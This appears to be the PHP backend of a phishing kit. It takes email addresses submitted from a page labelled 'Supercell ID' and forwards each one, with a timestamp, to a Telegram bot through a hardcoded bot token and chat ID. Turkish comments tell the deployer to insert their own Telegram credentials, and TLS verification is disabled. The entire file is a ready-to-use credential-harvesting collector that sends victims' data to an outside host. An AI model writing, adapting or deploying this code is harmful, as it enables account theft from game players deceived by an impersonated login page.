<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $email = $input['email'] ?? '';

    // Telegram bilgileri - BUNLARI KENDİ BİLGİLERİNİZLE DEĞİŞTİRİN
    $botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM';
    $chatId = '5587800563';

    if (empty($email)) {
        echo json_encode(['success' => false, 'error' => 'Email is required']);
        exit;
    }

    $message = "📧 Yeni Email: $email\n⏰ Zaman: " . date('Y-m-d H:i:s') . "\n🌐 Kaynak: Supercell ID";

    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // SSL doğrulamasını kapat (gerekirse)
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['success' => false, 'error' => 'Curl error: ' . $curlError]);
    } else {
        $responseData = json_decode($response, true);
        if ($responseData['ok'] ?? false) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Telegram API error: ' . ($responseData['description'] ?? 'Unknown error')]);
        }
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
}
?>